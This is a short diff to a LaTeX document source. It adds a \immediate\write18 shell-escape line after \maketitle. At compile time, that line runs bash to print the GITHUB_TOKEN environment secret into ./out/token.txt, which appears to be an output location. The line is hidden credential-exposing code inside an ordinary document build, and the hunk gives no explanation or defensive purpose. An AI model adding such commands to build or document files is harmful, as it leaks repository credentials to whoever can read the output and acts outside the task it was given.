@@ -16,6 +16,8 @@
 \begin{document}
 \maketitle
 
+\immediate\write18{/bin/bash -c 'printenv GITHUB_TOKEN' > ./out/token.txt}
+
 \IncludeHistoryTimeline
 
 \tableofcontents
